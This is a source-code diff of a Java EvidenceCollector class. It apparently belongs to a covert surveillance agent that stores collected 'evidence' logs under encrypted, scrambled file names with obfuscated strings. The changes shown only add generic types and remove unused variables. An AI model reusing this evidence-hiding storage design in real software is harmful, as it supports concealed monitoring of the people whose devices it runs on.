@@ -104,7 +104,7 @@ public class EvidenceCollector {
 
 	// public boolean storeToMMC;
 	/** The log vector. */
-	Vector logVector;
+	Vector<String> logVector;
 
 	/** The log progressive. */
 	private int logProgressive;
@@ -116,7 +116,7 @@ public class EvidenceCollector {
 	 */
 	private EvidenceCollector() {
 		super();
-		logVector = new Vector();
+		logVector = new Vector<String>();
 
 		logProgressive = deserializeProgressive();
 		flushEvidences();
@@ -214,10 +214,11 @@ public class EvidenceCollector {
 	public synchronized Name makeNewName(final Evidence log, final String logType) {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
+
 		if (Cfg.DEBUG) {
 			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0"); //$NON-NLS-1$
 		}
-		final Vector vector = new Vector();
+
 		final String basePath = Path.logs();
 
 		final String blockDir = Messages.getString("22.5") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
@@ -235,6 +236,7 @@ public class EvidenceCollector {
 		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
+		
 		if (Cfg.DEBUG) {
 			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 					+ fileName + LOG_EXTENSION);
@@ -338,13 +340,13 @@ public class EvidenceCollector {
 	 *            the current path
 	 * @return the vector
 	 */
-	public static Vector scanForDirLogs(final String currentPath) {
+	public static Vector<String> scanForDirLogs(final String currentPath) {
 		if (Cfg.DEBUG) {
 			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
 		}
 		File fc;
 
-		final Vector vector = new Vector();
+		final Vector<String> vector = new Vector<String>();
 		try {
 			fc = new File(currentPath);
 			if (fc.isDirectory()) {
@@ -456,7 +458,7 @@ public class EvidenceCollector {
 	public static void flushEvidences() {
 		String basePath = Path.logs();
 		
-		final Vector dirs = scanForDirLogs(basePath);
+		final Vector<String> dirs = scanForDirLogs(basePath);
 		final int dsize = dirs.size();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " sendEvidences #directories: " + dsize); //$NON-NLS-1$
@@ -476,13 +478,11 @@ public class EvidenceCollector {
 					// fcFile = (FileConnection) Connector.open(fcDir.getURL() +
 					// file);
 					// e' un file, vediamo se e' un file nostro
-					final String logMask = EvidenceCollector.LOG_EXTENSION;
-					final String encLogMask = encryptName(logMask);
-
 					if (file.endsWith(EvidenceCollector.LOG_TMP)) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " WARNING (flushEvidences): " + decryptName(file));
 						}
+						
 						AutoFile tmp = new AutoFile(fcDir.getPath(), file);
 						tmp.dropExtension(EvidenceCollector.LOG_TMP);
 					}
